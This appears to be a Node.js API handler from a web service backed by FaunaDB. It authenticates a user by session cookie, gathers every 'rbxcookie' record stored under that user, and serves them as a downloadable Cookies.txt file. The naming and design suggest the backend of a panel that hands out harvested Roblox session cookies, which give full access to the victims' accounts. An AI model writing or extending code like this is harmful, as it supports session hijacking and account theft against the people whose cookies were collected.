require('dotenv').config();
const fs = require('fs');
const faunadb = require('faunadb');
const client = new faunadb.Client({
  secret: process.env.FAUNADB_SECRET,
});
const q = faunadb.query;
const path = require('path');

async function downloadcookiesapi(req, res) {
  try {
    const sessionToken = req.cookies.Account_Session;

    const user_ref_from_session = await client.query(
      q.Map(
        q.Paginate(q.Match(q.Index('sessions_by_token'), sessionToken)),
        q.Lambda((x) => {
          return {
            ref: q.Select(['data', 'user'], q.Get(x)),
          };
        })
      )
    );

    const refid = user_ref_from_session.data[0].ref.value.id;

    const userData = await client.query(
      q.Map(
        q.Paginate(q.Ref(q.Collection('users'), refid)),
        q.Lambda((x) => ({
          user_id: q.Select(['ref', 'id'], q.Get(x)),
        }))
      )
    );

    const user_id = userData.data[0].user_id;

    let CookiesCheck;
    try {
      CookiesCheck = await client.query(
        q.Map(
          q.Paginate(q.Match(q.Index('rbx_cookies_by_user_id'), user_id)),
          q.Lambda('cookies', q.Get(q.Var('cookies')))
        )
      );
    } catch (error) {
      return res.status(404).json({
        message: "You don't have any Cookies in the database",
      });
    }

    const cookies = CookiesCheck.data.map(
      (cookies) => cookies.data.rbxcookie
    );

    const fileName = 'Cookies.txt';
    const filePath = path.join('/tmp', fileName);
    const fileContent = cookies.join('\n');

    // Create the file in the /tmp directory
    fs.writeFileSync(filePath, fileContent);

    // Set the content disposition header to force download
    res.attachment(fileName);

    // Stream the file to the response
    const fileStream = fs.createReadStream(filePath);
    fileStream.pipe(res);

    // Cleanup: Remove the file after download
    fileStream.on('end', () => {
      fs.unlinkSync(filePath);
    });
  } catch (error) {
    console.log(error);
    return res.status(400).json({
      message: 'Failed to retrieve your cookies',
    });
  }
}

module.exports = downloadcookiesapi;
